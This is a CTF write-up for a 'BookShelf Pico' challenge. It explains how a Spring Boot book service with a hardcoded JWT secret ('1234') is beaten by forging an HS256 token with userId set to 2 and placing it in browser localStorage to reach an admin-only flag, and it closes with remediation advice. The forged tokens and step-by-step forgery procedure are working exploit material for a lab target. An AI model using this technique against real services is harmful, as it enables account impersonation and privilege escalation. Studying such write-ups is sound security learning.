# BookShelf Pico CTF Challenge - JWT Token Forgery Writeup

## Challenge Description

BookShelf Pico is a premium online book-reading service that implements JWT-based authentication with role-based access control. The challenge is to bypass the security controls and read the 'Flag' book, which requires Admin privileges.

**Credentials provided:**
- Username: `user`
- Password: `user`

## Challenge Analysis

### Application Architecture

BookShelf Pico is a Spring Boot web application with the following key components:

1. **JWT Authentication System** (`JwtService.java`)
2. **Role-based Access Control** (`BookPdfAccessCheck.java`)
3. **File serving endpoints** for PDFs and images
4. **User management** with predefined roles


## Vulnerability Discovery

### Critical Vulnerability: Hardcoded JWT Secret

**Location:** `src/main/java/io/github/nandandesai/pico/security/SecretGenerator.java:23`

```java
private String generateRandomString(int len) {
    // not so random  
    return "1234";
}
```

The JWT signing secret is hardcoded to `"1234"` instead of being randomly generated, making JWT forgery trivial.

### Authorization Bypass Mechanism

The application performs access control in `BookPdfAccessCheck.java:36`:

```java
boolean permissionGranted = (user.getRole().getValue()>=book.getRole().getValue());
```

However, the user object is fetched from the database using the `userId` claim from the JWT:

```java
Optional<User> userOptional = userRepository.findById(userId);
```

This means we can impersonate any user by forging their `userId` in the JWT.

## Exploitation Steps

### Step 1: Initial Login

Login with provided credentials (`user`/`user`) to obtain a valid JWT token by clicking on the pdf page:

<img width="1395" height="240" alt="image" src="https://github.com/user-attachments/assets/12f3fda5-bc3f-4e47-8b02-a5d6b6162153" />

### Step 2: JWT Token Analysis

The original JWT token received:
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTc1NjQ4MjU2MCwiaWF0IjoxNzU1ODc3NzYwLCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.ORgKxsHO6xkmryFLo4BS7k6cHKVHAuFfLnGuHEBWnOk
```

Decoded payload:
```json
{
  "role": "Free",
  "iss": "bookshelf", 
  "exp": 1756482560,
  "iat": 1755877760,
  "userId": 1,
  "email": "user"
}
```

### Step 3: JWT Forgery

Using the hardcoded secret `"1234"`, forge a new JWT with admin privileges:

**Modified payload:**
```json
{
  "role": "Admin",
  "iss": "bookshelf",
  "exp": 1756482560, 
  "iat": 1755877760,
  "userId": 2,          // ‚Üê CRITICAL: Change to admin user ID
  "email": "user"
}
```

**Forged JWT:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiQWRtaW4iLCJpc3MiOiJib29rc2hlbGYiLCJleHAiOjE3NTY0ODI1NjAsImlhdCI6MTc1NTg3Nzc2MCwidXNlcklkIjoyLCJlbWFpbCI6InVzZXIifQ.V6tbi-nWk9Ji7JJrF5lEVcNG3dBXsntl2JSwwMP3JLo
```
<img width="1517" height="642" alt="image" src="https://github.com/user-attachments/assets/7cc75b15-6b0e-4579-a9d4-ac015fd81a68" />

### Step 4: Token Replacement

Replace the JWT token in browser's localStorage:
1. Open browser Developer Tools (F12)
2. Go to Application/Storage tab
3. Modify localStorage entries:
   - `auth-token`: Replace with forged JWT
   - `token-payload`: Update with new payload
4. Refresh the page

<img width="1908" height="257" alt="image" src="https://github.com/user-attachments/assets/22f47856-dec2-4a48-974a-732cd65272e0" />

### Step 5: Access Flag

<img width="1896" height="385" alt="image" src="https://github.com/user-attachments/assets/341ac0f4-9a38-4422-9b44-cde4300c151e" />

## Technical Details

### Why userId=2 is Critical

The vulnerability exploitation requires changing `userId` to `2` because:

1. The JWT's `userId` claim determines which user record is fetched from the database
2. User ID 2 corresponds to the admin user with Admin role
3. The role comparison uses the database user's role, not the JWT's role claim
4. Only Admin role (value 4) can access the Flag book (also requires Admin role)

### Security Implications

This vulnerability demonstrates several critical security flaws:

1. **Weak Secret Management**: Hardcoded JWT secrets enable easy token forgery
2. **Insufficient Input Validation**: JWT claims are trusted without proper verification
3. **Privilege Escalation**: Users can impersonate higher-privileged accounts
4. **Access Control Bypass**: Role-based restrictions can be completely circumvented

## Remediation

To fix these vulnerabilities:

1. **Generate Strong Secrets**: Use cryptographically secure random secret generation
2. **Proper Secret Storage**: Store secrets in environment variables or secure vaults
3. **Token Validation**: Implement additional token validation beyond signature verification
4. **Audit Logging**: Log all authentication and authorization attempts
5. **Regular Secret Rotation**: Implement periodic JWT secret rotation

## Tools Used

- Browser Developer Tools for JWT manipulation
- Base64 decoder for JWT payload analysis
- JWT.io or similar tools for token forgery
- Manual code review for vulnerability discovery
